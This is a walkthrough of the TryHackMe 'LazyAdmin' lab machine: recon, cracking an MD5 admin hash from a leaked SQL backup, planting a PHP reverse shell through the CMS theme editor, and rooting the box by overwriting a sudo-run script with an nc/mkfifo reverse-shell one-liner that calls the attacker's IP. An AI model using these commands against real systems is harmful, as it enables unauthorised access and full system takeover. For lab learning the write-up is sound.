---
layout: single
title: "LazyAdmin"
link: "https://tryhackme.com/room/lazyadmin"
parent: TryHackMe
os: Linux
difficulty: Easy
tags: [Nmap, Feroxbuster, Netcat]
starred: false
date: 2025-11-08
toc: true
toc_sticky: true
toc_label: "Mission Log"
toc_icon: "crosshairs"
---
# CTF Writeup: [{{ page.title }}]({{ page.machine_url }})
{% include ctf-badges.html %}

> **Link:** [**{{ page.parent }}**]({{ page.link }}) |
> **OS:** {{ page.os }} |
> **Difficulty:** {{ page.difficulty }} |
> **Date:** {{ page.date }} |
> **Author:** [*S3Z4R*](https://tryhackme.com/p/S3Z4R)

---
## 1. Reconnaissance
### Nmap Scanning
Using `nmap` we have only `22` and `80` up and running which is fine!
```bash
nmap -sV -sC -T4 -v <Machine-IP>
```

### Directory Enumeration
Using feroxbuster we can find the directories and subdomains:
```bash
feroxbuster -u http://<Machine-IP> -w kali-wordlists/dirb/big.txt
```
The interesting pages are:
```bash
http://<Machine-IP>/content/as/
http://<Machine-IP>/content/inc/
```
These are the login and contents which we have access to.

## 2. Initial Access
### Searching the Backup files
Looking into the backup Urls we can find the following url which has the mysql backups: 
```
http://<Machine-IP>/content/inc/mysql_backup/
```

Downloading the `.sql` file we can open and read it using an editor of your choice.
```
mysql_bakup_20191129023059-1.5.1.sql
```

Going through the file we can find the username on line 14: 
```
...s:5:\\"admin\\";s:7:\\"manager\\";...
```
The username is `manager`.

And for the password we found:
```
...s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";...
```
the hash is md5 and we can crack it.

### Cracking the Hash
We will save the hash into a file using the following command:
```bash
echo "42f749ade7f9e195bf475f37a44cafcb" > myhash.txt
```
Then crack it using `hashcat`:
```bash
hashcat -m 0 myhash.txt kali-wordlists/rockyou.txt
42f749ade7f9e195bf475f37a44cafcb:Password123
```
So the password for the user manager is `Password123`.

Now we can login from the login page which is located at:
```
http://<Machine-IP>/content/as/
```

## 3. User Flag
### Exploitation
One way to solve and get a reverse shell is to use the themes section.
we can add a new theme and use the
[***PentestMonkey***](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
reverse shell.
After saving the theme, we can see that it is located in the following url:
```
http://<Machine-IP>/content/_themes/default/cat.php
```
By going to this url we can gain the shell.
Don't forget the netcat command:
```bash
nc -lnvp 1234
```

### The Flag
After siging into the machine using the reverse shell we can find the `user.txt` in the following directory:
```
/home/itguy/user.txt
```
The flag is in the following format:
`THM{63e5...8a07}`

## 4. Priviledge Escalation
Using `sudo -l`
```
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```
By looking into the `backup.pl` we can see:
```bash
$ cat backup.pl
#!/usr/bin/perl
system("sh", "/etc/copy.sh");
```
And inside the `copy.sh`:
```bash
$ cat copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```
We already have the `copy.sh` and it is giving us the reverse shell, we just need to change the ip in the file as below:
```bash
$ echo "rm /tmp/f;mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc <Your-THM-IP> 5554 >/tmp/f" > /etc/copy.sh
```
After editing the file we should open netcat on another Terminal:
```bash
nc -lnvp 5554
```
Then on the shell we can run the script using:
```bash
$ sudo /usr/bin/perl /home/itguy/backup.pl
```
There we have the shell!

## 5. Root Flag
The root.txt is located on root directory and it is:
```bash
# cat root.txt
THM{6637...699f}
```

---

{% comment %}

[Technique]: Directory Brute Force
[Command]: feroxbuster -u http://<IP> -w /usr/share/wordlists/dirb/big.txt
[Why]: Discovered hidden CMS login pages (/content/as/) and database backups.

[Technique]: Reverse Shell Listener
[Command]: nc -lnvp 1234
[Why]: Catches the connection from the PHP reverse shell uploaded to the CMS.

[Technique]: Perl Script Injection
[Command]: echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 5554 >/tmp/f" > /etc/copy.sh
[Why]: Overwrote a script called by a sudo-enabled Perl backup file to escalate to root.

{% endcomment %}
